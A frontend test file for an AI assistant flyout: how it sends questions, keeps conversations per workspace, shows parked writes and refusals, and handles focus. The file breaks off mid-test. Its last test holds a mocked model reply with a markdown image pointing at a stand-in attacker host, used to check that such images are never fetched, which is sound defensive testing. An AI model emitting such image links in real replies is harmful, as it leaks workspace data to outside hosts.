// @vitest-environment jsdom
// The assistant flyout over a fake turn action: that it asks and shows the
// reply, carries the conversation across turns, names the run each turn was
// recorded as, surfaces parked writes rather than swallowing them, reads each
// refusal, offers no composer outside a workspace, and keeps the transcript to
// the workspace it was asked in.
//
// The flyout WL-06 deleted had a `disabled` textarea, so the assertion that
// earns this file is the first one: a composer that reaches ask_assistant.
import {
  act,
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { createRoot } from "react-dom/client";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import type { ReactNode } from "react";
import { expectNoAxe } from "@/test/expect-no-axe";
import { IntlProvider } from "@/test/intl";
import { openAssistantDraft } from "@/shared/assistant-draft";
import { PageRecord } from "./page-record";
import { ShellStateProvider, useShellState } from "./shell-state";

declare global {
  /**
   * `@testing-library/react` and React's own `act` read this to decide whether
   * React's scheduled work is flushed by the test or by the real scheduler.
   * One test below turns it off, to reproduce the gap between a commit and its
   * passive effects that `act` otherwise closes.
   */
  var IS_REACT_ACT_ENVIRONMENT: boolean;
}

const askAssistant = vi.fn();
vi.mock("./assistant-actions", () => ({ askAssistant }));

// One `url` for both hooks, split the way Next.js splits it: `usePathname`
// omits the query string, which is the whole of finding #4040859958.
const pathname = vi.fn(() => "/acme/core-platform");
const refresh = vi.fn();
vi.mock("next/navigation", () => ({
  usePathname: () => pathname().split("?")[0],
  useSearchParams: () => new URLSearchParams(pathname().split("?")[1] ?? ""),
  useRouter: () => ({ push: vi.fn(), replace: vi.fn(), refresh }),
}));

const { AssistantFlyout } = await import("./assistant-flyout");

function OpenIt() {
  const { setAssistantOpen } = useShellState();
  return (
    <button
      type="button"
      onClick={() => {
        setAssistantOpen(true);
      }}
    >
      open assistant
    </button>
  );
}

// A fresh element each time: React bails out of a re-render handed the very
// same element, and these tests re-render to move the person to another page.
//
// `page` stands in for what the layout puts beside the chrome. It sits outside
// `ShellStateProvider` because the real page does: `ShellClient` renders chrome
// only, which is why a page declares its record through a module store rather
// than through the shell's context.
const tree = (page?: ReactNode) => (
  <IntlProvider>
    <ShellStateProvider>
      <OpenIt />
      <AssistantFlyout />
    </ShellStateProvider>
    {page}
  </IntlProvider>
);

async function openFlyout(page?: ReactNode) {
  const user = userEvent.setup();
  const { rerender } = render(tree(page));
  await user.click(screen.getByRole("button", { name: "open assistant" }));
  /** Move to another page, the way a navigation does under the persistent shell. */
  const renavigate = (to: string) => {
    pathname.mockReturnValue(to);
    rerender(tree(page));
  };
  return {
    user,
    renavigate,
    flyout: screen.getByTestId("assistant-flyout"),
  };
}

/** A macrotask: React schedules a commit's passive effects on one of these. */
const tick = () => new Promise((resolve) => setTimeout(resolve, 0));

async function ask(user: ReturnType<typeof userEvent.setup>, text: string) {
  await user.type(screen.getByTestId("assistant-composer"), text);
  await user.click(screen.getByTestId("assistant-send"));
}

/**
 * A reply reveals a few characters at a time (assistant-streaming-text.tsx)
 * rather than snapping in whole, so a check against the full text has to wait
 * for the reveal to catch up instead of asserting the instant the answer
 * lands in the DOM.
 */
async function findAnswerText(text: string) {
  await waitFor(() => {
    expect(screen.getByTestId("assistant-answer")).toHaveTextContent(text);
  });
}

const turn = (over: Record<string, unknown> = {}) => ({
  ok: true,
  value: {
    conversationId: "6f1f5a8e-0000-4000-8000-00000000c0de",
    userMessageId: "6f1f5a8e-0000-4000-8000-00000000u001",
    assistantMessageId: "6f1f5a8e-0000-4000-8000-00000000a001",
    runId: "arun_01k9",
    reply: "Three runs are live.",
    parkedCards: [],
    ...over,
  },
});

// A viewport the tests drive: the flyout covers the application below `md` and
// sits beside the page above it, so the breakpoint is an input, not the window.
const viewport = { belowMd: false, listeners: new Set<() => void>() };
function setViewport(belowMd: boolean) {
  viewport.belowMd = belowMd;
  act(() => {
    for (const listener of [...viewport.listeners]) listener();
  });
}

beforeAll(() => {
  vi.stubGlobal("matchMedia", (query: string) => ({
    get matches() {
      return query.includes("max-width") ? viewport.belowMd : false;
    },
    media: query,
    addEventListener: (_: string, listener: () => void) => {
      viewport.listeners.add(listener);
    },
    removeEventListener: (_: string, listener: () => void) => {
      viewport.listeners.delete(listener);
    },
  }));
});

beforeEach(() => {
  viewport.belowMd = false;
  viewport.listeners.clear();
  askAssistant.mockReset();
  refresh.mockReset();
  askAssistant.mockResolvedValue(turn());
  pathname.mockReturnValue("/acme/core-platform");
});
afterEach(cleanup);

describe("AssistantFlyout", () => {
  it("asks ask_assistant for the workspace the person is standing in, and shows the reply", async () => {
    const { user } = await openFlyout();
    await ask(user, "what is live?");

    expect(askAssistant).toHaveBeenCalledWith("acme", "core-platform", {
      conversationId: null,
      content: "what is live?",
      route: "fleet",
      entityId: null,
    });
    await findAnswerText("Three runs are live.");
  });

  it("carries the conversation into the next turn rather than starting over", async () => {
    const { user } = await openFlyout();
    await ask(user, "first");
    await screen.findByTestId("assistant-answer");
    await ask(user, "second");

    expect(askAssistant.mock.calls[1]?.[2]).toMatchObject({
      conversationId: "6f1f5a8e-0000-4000-8000-00000000c0de",
      content: "second",
    });
  });

  it("carries the page the person asked from, so the agent is asked about what is on screen", async () => {
    pathname.mockReturnValue("/acme/core-platform/runs/arun_01k9");
    const { user } = await openFlyout();
    await ask(user, "why did this fail?");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "runs",
      entityId: "arun_01k9",
    });
  });

  // The page declares what it is showing, and the shell believes it. It used to
  // read the URL instead, which is guessing: `/spend?tab=budgets&finding=fnd_1`
  // renders no finding, `/register/wrap?agent=...` keeps the record in the query
  // and the step in the path, and any value under the cap was forwarded. All
  // three are one defect, and the page's own parse is the thing that knows.
  it.each([
    {
      page: "a finding on Spend",
      url: "/acme/core-platform/spend?tab=findings&finding=fnd_014",
      route: "spend",
      entityId: "fnd_014",
    },
    {
      page: "a proposal on Steering",
      url: "/acme/core-platform/steering?tab=prs&proposal=prp_7",
      route: "steering",
      entityId: "prp_7",
    },
    {
      page: "the agent being registered, not the step",
      url: "/acme/core-platform/register/wrap?agent=agt_31",
      route: "register",
      entityId: "agt_31",
    },
  ])("carries the record $page declares", async (view) => {
    pathname.mockReturnValue(view.url);
    const { user } = await openFlyout(
      <PageRecord route={view.route} id={view.entityId} />,
    );
    await ask(user, "explain this");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: view.route,
      entityId: view.entityId,
    });
  });

  // The case the old URL reading got wrong, and the reason the page declares:
  // `parseSpendView` ignores a `finding` outside the Findings tab, so the page
  // renders none and says so, while the query string still names one.
  it("carries no record when the page declares none, whatever the query says (negative)", async () => {
    pathname.mockReturnValue(
      "/acme/core-platform/spend?tab=budgets&finding=fnd_1",
    );
    const { user } = await openFlyout(<PageRecord route="spend" id={null} />);
    await ask(user, "explain this");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "spend",
      entityId: null,
    });
  });

  // The sharpest form of the same rule, and the original defect exactly. On
  // `/register/name` no agent has been minted yet, so the page declares `null`
  // while the path still carries a segment after the route. A declaration of
  // "no record" has to outrank that segment, or the assistant is told the
  // record on screen is `name` -- the step.
  it("believes a page that declares no record over the path segment beside it (negative)", async () => {
    pathname.mockReturnValue("/acme/core-platform/register/name");
    const { user } = await openFlyout(
      <PageRecord route="register" id={null} />,
    );
    await ask(user, "what do I do here?");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "register",
      entityId: null,
    });
  });

  // A page that declares nothing at all leaves the query alone too: the shell
  // has no second way to read it any more.
  it("carries no record for a query value on a page that declares nothing (negative)", async () => {
    pathname.mockReturnValue(
      "/acme/core-platform/spend?tab=keys&note=ignore+me&proposal=wrong-route",
    );
    const { user } = await openFlyout();
    await ask(user, "explain this");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "spend",
      entityId: null,
    });
  });

  // React may mount the next page before unmounting the last, so a declaration
  // can outlive the page that made it. It carries its route, and the flyout
  // reads it only for the route it is on, which makes a leftover unusable
  // rather than wrong.
  it("ignores a declaration left by another route (negative)", async () => {
    pathname.mockReturnValue("/acme/core-platform/steering?tab=prs");
    const { user } = await openFlyout(
      <PageRecord route="spend" id="fnd_014" />,
    );
    await ask(user, "explain this");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "steering",
      entityId: null,
    });
  });

  // React is free to mount the next page before unmounting the last, and on
  // that ordering the departing page's cleanup runs after the arriving page has
  // already declared. A cleanup that clears unconditionally takes the new
  // page's record with it, and the assistant is asked about nothing while a
  // record is plainly on screen. The declaration is cleared only by whoever
  // still owns it.
  it("keeps the arriving page's record when the departing page unmounts after it (negative)", async () => {
    pathname.mockReturnValue("/acme/core-platform/steering?tab=prs");
    const user = userEvent.setup();
    const { rerender } = render(
      tree(
        <>
          <PageRecord key="leaving" route="spend" id="fnd_014" />
          <PageRecord key="arriving" route="steering" id="prp_7" />
        </>,
      ),
    );
    await user.click(screen.getByRole("button", { name: "open assistant" }));

    // The departing page goes; the arriving one stays mounted and does not
    // re-declare, because nothing about it changed.
    rerender(
      tree(
        <>
          <PageRecord key="arriving" route="steering" id="prp_7" />
        </>,
      ),
    );

    await ask(user, "explain this");
    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "steering",
      entityId: "prp_7",
    });
  });

  // `entityId` is capped at 256 characters by `assistantPageContextSchema`; a
  // longer one is no id, and sending it would refuse the whole turn for being
  // invalid rather than answer the question without it.
  it("drops a record id longer than the contract accepts rather than refusing the turn (negative)", async () => {
    pathname.mockReturnValue("/acme/core-platform/steering?tab=prs");
    const { user } = await openFlyout(
      <PageRecord route="steering" id={"p".repeat(257)} />,
    );
    await ask(user, "explain this");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "steering",
      entityId: null,
    });
  });

  // A route whose record is the path segment after it needs no declaration:
  // there the URL cannot disagree with the page, because there is nothing to
  // parse. The query string is not read on any route any more.
  it("reads the path on a route that keeps its record there, whatever the query says", async () => {
    pathname.mockReturnValue(
      "/acme/core-platform/runs/arun_01k9?finding=not-this",
    );
    const { user } = await openFlyout();
    await ask(user, "why did this fail?");

    expect(askAssistant.mock.calls[0]?.[2]).toMatchObject({
      route: "runs",
      entityId: "arun_01k9",
    });
  });

  it("names the run each turn was recorded as", async () => {
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    expect(await screen.findByTestId("assistant-answer")).toHaveTextContent(
      "arun_01k9",
    );
  });

  // The run is excluded from every list, so this line is the one way from
  // the answer to its evidence. The Run page reads `get_run` now (WL-35),
  // so the id links there.
  it("links the run id to its Run page", async () => {
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    const line = await screen.findByTestId("assistant-recorded-as");
    expect(line).toHaveTextContent("recorded as arun_01k9");
    expect(line.querySelector("a")).toHaveAttribute(
      "href",
      "/acme/core-platform/runs/arun_01k9",
    );
  });

  it("surfaces every parked write rather than dropping the ones it cannot show", async () => {
    askAssistant.mockResolvedValue(
      turn({
        parkedCards: [
          {
            approvalId: "apr_1",
            capability: "retire_agent",
            expiresAt: "2026-09-17T18:00:00Z",
          },
          {
            approvalId: "apr_2",
            capability: "set_kill_switch",
            expiresAt: "2026-09-17T18:00:00Z",
          },
        ],
      }),
    );
    const { user } = await openFlyout();
    await ask(user, "retire the stale agent");
    expect(await screen.findByTestId("assistant-parked")).toHaveTextContent(
      "2 writes are waiting on a person",
    );
  });

  // Fleet reads its approvals once, on the server, when it renders
  // (features/fleet/fleet.tsx) — a write parked by this turn is not in that
  // read, and the sentence beside the cards tells the person to go approve
  // them there before they expire.
  it("re-renders the server components when a turn parks writes, so Fleet can show them", async () => {
    askAssistant.mockResolvedValue(
      turn({
        parkedCards: [
          {
            approvalId: "apr_1",
            capability: "retire_agent",
            expiresAt: "2026-09-17T18:00:00Z",
          },
        ],
      }),
    );
    const { user } = await openFlyout();
    await ask(user, "retire the stale agent");
    await screen.findByTestId("assistant-parked");
    expect(refresh).toHaveBeenCalledTimes(1);
  });

  it("refreshes nothing for a turn that parked no write (negative)", async () => {
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    await screen.findByTestId("assistant-answer");
    expect(refresh).not.toHaveBeenCalled();
  });

  it("refreshes nothing for a refused turn (negative)", async () => {
    askAssistant.mockResolvedValue({
      ok: false,
      reason: "denied",
      code: "forbidden",
    });
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    await screen.findByTestId("assistant-denied");
    expect(refresh).not.toHaveBeenCalled();
  });

  it("reads a refusal rather than showing an empty answer (negative)", async () => {
    askAssistant.mockResolvedValue({
      ok: false,
      reason: "denied",
      code: "forbidden",
    });
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    expect(await screen.findByTestId("assistant-denied")).toBeTruthy();
    expect(screen.queryByTestId("assistant-answer")).toBeNull();
  });

  it("says the budget is gone when the turn is refused for it (negative)", async () => {
    askAssistant.mockResolvedValue({
      ok: false,
      reason: "exhausted",
      code: "gau_exhausted",
    });
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    expect(await screen.findByTestId("assistant-exhausted")).toBeTruthy();
  });

  it("survives a thrown action without claiming an answer (negative)", async () => {
    askAssistant.mockRejectedValue(new Error("network"));
    const { user } = await openFlyout();
    await ask(user, "what is live?");
    expect(await screen.findByTestId("assistant-unavailable")).toBeTruthy();
    expect(screen.queryByTestId("assistant-answer")).toBeNull();
  });

  it("offers no composer outside a workspace, and asks nothing (negative)", async () => {
    pathname.mockReturnValue("/acme/billing");
    await openFlyout();
    expect(screen.queryByTestId("assistant-composer")).toBeNull();
    expect(screen.getByTestId("assistant-needs-workspace")).toBeTruthy();
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("starts over in the next workspace rather than carrying a conversation that scope would reject", async () => {
    const { user, renavigate } = await openFlyout();
    await ask(user, "first");
    await screen.findByTestId("assistant-answer");

    renavigate("/acme/payments");

    // The transcript belonged to core-platform; payments opens empty.
    expect(screen.queryByTestId("assistant-log")).toBeNull();
    expect(screen.getByTestId("assistant-intro")).toBeTruthy();

    await ask(user, "second");
    expect(askAssistant.mock.calls[1]).toEqual([
      "acme",
      "payments",
      {
        conversationId: null,
        content: "second",
        route: "fleet",
        entityId: null,
      },
    ]);
  });

  /** A turn the test resolves by hand, so it can still be in flight when the person moves. */
  function heldTurn() {
    let settle: (turn: unknown) => void = () => undefined;
    askAssistant.mockReturnValueOnce(
      new Promise((resolve) => {
        settle = resolve;
      }),
    );
    return (over: Record<string, unknown> = {}) => {
      settle(turn(over));
    };
  }

  /** Let a settled action's continuation run and its state updates commit. */
  async function flush() {
    await act(async () => {
      await Promise.resolve();
    });
  }

  // ADR-092: a turn the person walks away from is owned to completion. It used
  // to be discarded, which threw away an answer the person had asked for and
  // the budget already spent on it. Its reply goes to the thread of the
  // workspace it was asked in, never to the one the person moved to.
  it("keeps a reply that lands after the person left, in the workspace it was asked in", async () => {
    const settle = heldTurn();
    const { user, renavigate } = await openFlyout();
    await ask(user, "what is live?");
    expect(screen.getByTestId("assistant-thinking")).toBeTruthy();

    renavigate("/acme/payments");
    settle({ reply: "core-platform is live." });
    await flush();

    // Payments is handed nothing, and its own composer is not held up by a
    // turn that belongs to another workspace.
    expect(screen.queryByText("core-platform is live.")).toBeNull();
    expect(screen.queryByTestId("assistant-thinking")).toBeNull();
    expect(screen.getByTestId("assistant-composer")).not.toBeDisabled();

    renavigate("/acme/core-platform");
    await findAnswerText("core-platform is live.");
    // The conversation survived the trip, not only its last line: a turn that
    // resolves into a thread cleared on leaving would recreate it holding the
    // answer alone, with the question that prompted it gone.
    expect(screen.getByText("what is live?")).toBeTruthy();
  });

  // Away and back before the turn resolves. The old guard counted visits so a
  // reply from the first could not land in the transcript the second had just
  // cleared. Nothing is cleared now, so the reply belongs where it lands, and
  // the conversation it opened is the one the next question continues.
  it("keeps the turn from an earlier visit, and its conversation, when the person goes away and comes back", async () => {
    const settle = heldTurn();
    const { user, renavigate } = await openFlyout();
    await ask(user, "what is live?");

    renavigate("/acme/payments");
    renavigate("/acme/core-platform");
    settle({ reply: "an answer from the first visit." });
    await flush();

    await findAnswerText("an answer from the first visit.");
    expect(screen.getByText("what is live?")).toBeTruthy();
    askAssistant.mockResolvedValue(turn());
    await ask(user, "second");
    expect(askAssistant.mock.calls[1]?.[2]).toMatchObject({
      conversationId: "6f1f5a8e-0000-4000-8000-00000000c0de",
    });
  });

  // One thread holds at most one turn in flight, which is what makes a single
  // writer of `conversationId` true. Drop the `pending` gate and a thread's
  // conversation id has two.
  it("refuses a second question while a turn is in flight (negative)", async () => {
    askAssistant.mockReturnValue(new Promise(() => undefined));
    const { user } = await openFlyout();
    await ask(user, "first");

    expect(screen.getByTestId("assistant-composer")).toBeDisabled();
    await user.type(screen.getByTestId("assistant-composer"), "second");
    await user.click(screen.getByTestId("assistant-send"));
    expect(askAssistant).toHaveBeenCalledTimes(1);
  });

  // Leaving used to clear `pending`, so a person who came back could ask again
  // while the first turn was still running, and two turns then raced for the
  // one conversation id. Leaving no longer touches the thread, so the gate
  // above holds across the round trip and the race has nothing to race.
  it("still refuses a second question after leaving and coming back while the first is in flight (negative)", async () => {
    const settle = heldTurn();
    const { user, renavigate } = await openFlyout();
    await ask(user, "first");

    renavigate("/acme/payments");
    renavigate("/acme/core-platform");

    expect(screen.getByTestId("assistant-thinking")).toBeTruthy();
    expect(screen.getByTestId("assistant-composer")).toBeDisabled();
    await user.type(screen.getByTestId("assistant-composer"), "second");
    await user.click(screen.getByTestId("assistant-send"));
    expect(askAssistant).toHaveBeenCalledTimes(1);

    settle({ reply: "the first answer." });
    await flush();
    expect(screen.getAllByTestId("assistant-answer")).toHaveLength(1);
    await findAnswerText("the first answer.");
  });

  // Two workspaces are two conversations. A turn running in one does not stop
  // the person asking something in another.
  it("lets another workspace ask while this one's turn is in flight", async () => {
    heldTurn();
    const { user, renavigate } = await openFlyout();
    await ask(user, "first");

    renavigate("/acme/payments");
    askAssistant.mockResolvedValue(turn({ reply: "payments is quiet." }));
    await ask(user, "and here?");

    expect(askAssistant.mock.calls[1]).toEqual([
      "acme",
      "payments",
      {
        conversationId: null,
        content: "and here?",
        route: "fleet",
        entityId: null,
      },
    ]);
    await findAnswerText("payments is quiet.");
  });

  // A half-typed question belongs to the workspace it was typed in, the same
  // way a half-typed message already survives closing the flyout.
  it("keeps each workspace's half-typed question to itself", async () => {
    const { user, renavigate } = await openFlyout();
    await user.type(screen.getByTestId("assistant-composer"), "half a thought");

    renavigate("/acme/payments");
    expect(screen.getByTestId("assistant-composer")).toHaveValue("");

    renavigate("/acme/core-platform");
    expect(screen.getByTestId("assistant-composer")).toHaveValue(
      "half a thought",
    );
  });

  // The hazard the abandoned turn actually carried: governed writes parked and
  // waiting on a person who has moved on. The notice waits in the turn's own
  // thread, and the refresh runs wherever the person is standing, because the
  // shell's waiting count spans the organization.
  it("keeps the parked writes of a turn the person walked away from, and still refreshes the waiting count", async () => {
    const settle = heldTurn();
    const { user, renavigate } = await openFlyout();
    await ask(user, "rotate the key");

    renavigate("/acme/payments");
    settle({
      reply: "I have asked for approval to rotate it.",
      parkedCards: [
        {
          approvalId: "apr_01",
          capability: "rotate_api_key",
          expiresAt: "2026-09-19T00:00:00.000Z",
        },
      ],
    });
    await flush();

    expect(refresh).toHaveBeenCalledTimes(1);
    expect(screen.queryByTestId("assistant-parked")).toBeNull();

    renavigate("/acme/core-platform");
    expect(await screen.findByTestId("assistant-parked")).toBeTruthy();
    expect(screen.getByText("rotate the key")).toBeTruthy();
  });

  // The window between two moments React does not make adjacent: the
  // workspace-change render commits, and React flushes that render's passive
  // effects a task later. The discarding guard this replaced could be read
  // stale in that gap, which is why it had to be written during render. The
  // ownership routing has no such gap to lose: whatever the timing, the reply
  // goes to the thread it was asked in. This drives its own root, out of
  // `act`, so the scheduler opens the window the way a browser does.
  it("never hands a reply to the workspace the person moved to, even when it resolves between the switch and its effects (negative)", async () => {
    const settle = heldTurn();
    const host = document.createElement("div");
    document.body.append(host);
    const root = createRoot(host);
    const user = userEvent.setup();
    try {
      act(() => {
        root.render(tree());
      });
      await user.click(screen.getByRole("button", { name: "open assistant" }));
      await ask(user, "what is live?");
      expect(screen.getByTestId("assistant-thinking")).toBeTruthy();

      IS_REACT_ACT_ENVIRONMENT = false;
      pathname.mockReturnValue("/acme/payments");
      root.render(tree());
      await tick();
      // Committed: payments is on screen, its own thread empty…
      expect(screen.queryByTestId("assistant-log")).toBeNull();
      // …and this is the window.
      settle({ reply: "core-platform is live." });
      await tick();
      await tick();

      expect(screen.queryByTestId("assistant-answer")).toBeNull();
      expect(screen.queryByText("core-platform is live.")).toBeNull();

      pathname.mockReturnValue("/acme/core-platform");
      root.render(tree());
      await tick();
      await findAnswerText("core-platform is live.");
    } finally {
      IS_REACT_ACT_ENVIRONMENT = true;
      act(() => {
        root.unmount();
      });
      host.remove();
    }
  });

  it("keeps the transcript across an organization page, which owns no conversation", async () => {
    const { user, renavigate } = await openFlyout();
    await ask(user, "first");
    await screen.findByTestId("assistant-answer");

    renavigate("/acme/billing");
    expect(screen.getByTestId("assistant-needs-workspace")).toBeTruthy();
    renavigate("/acme/core-platform/runs");

    expect(screen.getByTestId("assistant-answer")).toBeTruthy();
    await ask(user, "second");
    expect(askAssistant.mock.calls[1]?.[2]).toMatchObject({
      conversationId: "6f1f5a8e-0000-4000-8000-00000000c0de",
    });
  });

  it("sends nothing for a blank question (negative)", async () => {
    const { user } = await openFlyout();
    await user.click(screen.getByTestId("assistant-send"));
    expect(askAssistant).not.toHaveBeenCalled();
  });

  it("is inert while closed, so it is out of the tab order", () => {
    render(
      <IntlProvider>
        <ShellStateProvider>
          <AssistantFlyout />
        </ShellStateProvider>
      </IntlProvider>,
    );
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute("inert");
  });

  it("gives focus back to the launcher it was opened from, on Escape and on the close button", async () => {
    for (const close of ["escape", "button"] as const) {
      const user = userEvent.setup();
      render(tree());
      const launcher = screen.getByRole("button", { name: "open assistant" });
      await user.click(launcher);
      const flyout = screen.getByTestId("assistant-flyout");
      expect(document.activeElement).toBe(
        screen.getByRole("button", { name: "Close the assistant" }),
      );

      if (close === "escape") await user.keyboard("{Escape}");
      else
        await user.click(
          screen.getByRole("button", { name: "Close the assistant" }),
        );

      expect(flyout).toHaveAttribute("inert");
      // Not left on a control inside an inert panel, and not dropped to <body>.
      expect(document.activeElement).toBe(launcher);
      cleanup();
    }
  });

  it("drops focus rather than leaving it inside the inert panel when the control that opened it is gone (negative)", async () => {
    const user = userEvent.setup();
    render(tree());
    // Stand in for the phone drawer's launcher, which unmounts with the
    // drawer behind the flyout. Outside React, so cleanup is not fighting it.
    const opener = document.createElement("button");
    document.body.append(opener);
    opener.focus();
    // A programmatic click does not move focus, so the flyout opens with the
    // opener still focused — what a tap on the drawer's launcher leaves.
    act(() => {
      screen.getByRole("button", { name: "open assistant" }).click();
    });
    expect(document.activeElement).toBe(
      screen.getByRole("button", { name: "Close the assistant" }),
    );
    opener.remove();

    await user.keyboard("{Escape}");
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute("inert");
    expect(document.activeElement).toBe(document.body);
  });

  // Below `md` the flyout is `w-full` and covers the application. A plain panel
  // there leaves a keyboard user tabbing past the send button into invisible
  // top-bar, navigation and page controls — and once focus is outside the
  // panel, its own Escape handler never hears the key. Inerting everything
  // outside is the containment: nothing else can be focused, so focus cannot
  // leave, which is what a modal dialog does with the top layer.
  it("makes the application behind it inert while it covers the screen", async () => {
    viewport.belowMd = true;
    const user = userEvent.setup();
    render(tree());
    const launcher = screen.getByRole("button", { name: "open assistant" });

    await user.click(launcher);
    const flyout = screen.getByTestId("assistant-flyout");
    expect(flyout).toHaveAttribute("aria-modal", "true");
    expect(launcher).toHaveAttribute("inert");
    await expectNoAxe(flyout);

    await user.keyboard("{Escape}");
    expect(launcher).not.toHaveAttribute("inert");
    expect(document.activeElement).toBe(launcher);
  });

  // Above `md` it is a panel beside the page, not over it: the page it is
  // being asked about stays readable and clickable.
  it("leaves the application usable on a wide screen, where it covers nothing (negative)", async () => {
    const user = userEvent.setup();
    render(tree());
    const launcher = screen.getByRole("button", { name: "open assistant" });

    await user.click(launcher);
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute(
      "aria-modal",
      "false",
    );
    expect(launcher).not.toHaveAttribute("inert");
  });

  // The flyout is open across a rotation or a resize, and the same panel is a
  // modal dialog on one side of the breakpoint and not on the other.
  it("takes and gives back the application when the viewport crosses the breakpoint while open", async () => {
    const user = userEvent.setup();
    render(tree());
    const launcher = screen.getByRole("button", { name: "open assistant" });
    await user.click(launcher);
    expect(launcher).not.toHaveAttribute("inert");

    setViewport(true);
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute(
      "aria-modal",
      "true",
    );
    expect(launcher).toHaveAttribute("inert");

    setViewport(false);
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute(
      "aria-modal",
      "false",
    );
    expect(launcher).not.toHaveAttribute("inert");
  });

  // Above `md` the page behind stays interactive on purpose, so focus can be
  // sitting on a page control when a resize or a rotation crosses below the
  // breakpoint. Inerting the application under a focused control without moving
  // focus leaves a keyboard user on something they cannot see or reach — and
  // once focus is outside the panel, Escape never reaches its handler either.
  it("takes focus into the panel when a resize makes it modal under a focused page control", async () => {
    const user = userEvent.setup();
    render(tree());
    const launcher = screen.getByRole("button", { name: "open assistant" });
    await user.click(launcher);

    // Focus back out onto the page, which a wide screen allows on purpose.
    act(() => {
      launcher.focus();
    });
    expect(document.activeElement).toBe(launcher);

    setViewport(true);

    expect(launcher).toHaveAttribute("inert");
    expect(document.activeElement).toBe(
      screen.getByRole("button", { name: "Close the assistant" }),
    );
    // And Escape is heard again, because focus is inside the panel.
    await user.keyboard("{Escape}");
    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute("inert");
  });

  // Focus that is already inside the panel when the breakpoint is crossed is
  // left where it is: becoming modal must not yank a person off the composer
  // they are typing in.
  it("leaves focus alone when it is already inside the panel as it becomes modal (negative)", async () => {
    const user = userEvent.setup();
    render(tree());
    await user.click(screen.getByRole("button", { name: "open assistant" }));
    const composer = screen.getByTestId("assistant-composer");
    act(() => {
      composer.focus();
    });

    setViewport(true);

    expect(document.activeElement).toBe(composer);
  });

  // The launcher saved at the open is still *connected* after a resize below
  // `md` — the sidebar that holds it is `hidden`, not unmounted — so `focus()`
  // is a no-op. Checking only `isConnected` returned as though the restore had
  // worked, leaving focus on a panel that had just gone `inert`. The fix checks
  // that focus actually moved, so it does not care *why* it did not.
  //
  // The stand-in is `disabled`, not a hidden ancestor: jsdom does no layout, so
  // `hidden`, `display: none` and an `inert` ancestor all still take focus
  // there, and `disabled` is the one connected-but-unfocusable state it models.
  // It reaches the same branch — `focus()` returns with `activeElement`
  // unchanged — which is the whole of what this asserts.
  it("drops focus rather than trusting a restore to a launcher that has become unfocusable (negative)", async () => {
    const user = userEvent.setup();
    render(tree());
    const launcher = screen.getByRole<HTMLButtonElement>("button", {
      name: "open assistant",
    });
    await user.click(launcher);
    expect(document.activeElement).toBe(
      screen.getByRole("button", { name: "Close the assistant" }),
    );

    launcher.disabled = true;

    await user.keyboard("{Escape}");

    expect(screen.getByTestId("assistant-flyout")).toHaveAttribute("inert");
    expect(document.activeElement).not.toBe(launcher);
    expect(document.activeElement).toBe(document.body);
  });

  // A reply arrives asynchronously while focus is still on the composer or the
  // close button. A refusal carries `role="alert"`, which is assertive and is
  // announced on insertion; an answer is an ordinary paragraph, so the
  // transcript itself has to be the live region — and it has to be there
  // before the text is. A polite region inserted in the same commit as its
  // contents is announced unreliably, so the container renders on every pass
  // and only what is inside it changes.
  it("announces a reply in a live region that was already there when the question was asked", async () => {
    const { user } = await openFlyout();
    const log = screen.getByRole("log");

    await ask(user, "what is live?");
    const answer = await screen.findByTestId("assistant-answer");

    // The same node, not one that arrived with the reply it is announcing.
    expect(screen.getByRole("log")).toBe(log);
    expect(log).toContainElement(answer);
  });

  // The transcript is a live region, and a reveal rewrites the answer's text
  // on every frame. Frozen mid-reveal here (no animation frame ever runs), the
  // growing copy has to be out of the accessibility tree and the whole reply
  // present once, in the copy the region announces.
  it("announces the whole reply once rather than every frame of its reveal", async () => {
    const frames = vi
      .spyOn(window, "requestAnimationFrame")
      .mockImplementation(() => 1);
    try {
      const { user } = await openFlyout();
      await ask(user, "what is live?");
      const answer = await screen.findByTestId("assistant-answer");

      expect(answer.querySelector("[inert]")).toHaveAttribute(
        "aria-hidden",
        "true",
      );
      expect(
        screen.getByTestId("assistant-answer-announced"),
      ).toHaveTextContent("Three runs are live.");
    } finally {
      frames.mockRestore();
    }
  });

  // The announced copy is visually hidden, and the growing copy is inert, so a
  // real anchor in the announced copy would be the only tab stop in the answer
  // and one nobody can see.
  it("puts no link from the hidden announced copy in the tab order (negative)", async () => {
    askAssistant.mockResolvedValue(
      turn({ reply: "Read [the runbook](https://oxagen.sh/docs) first." }),
    );
    const frames = vi
      .spyOn(window, "requestAnimationFrame")
      .mockImplementation(() => 1);
    try {
      const { user } = await openFlyout();
      await ask(user, "what is live?");
      const announced = await screen.findByTestId("assistant-answer-announced");

      expect(announced).toHaveTextContent("Read the runbook first.");
      expect(announced.querySelector("a")).toBeNull();
    } finally {
      frames.mockRestore();
    }
  });

  // A reply is model output, and an image in it would be fetched the moment it
  // rendered, carrying whatever the model put in its URL to that host.
  it("renders an image in a reply as its alt text and never fetches it (negative)", async () => {
    askAssistant.mockResolvedValue(
      turn({
        reply: "See ![workspace secret](https://attacker.example/x?d=1)",
      }),
    );
    const { user, flyout } = await openFlyout();
    await ask(user, "what is live?");
    await findAnswerText("workspace secret");

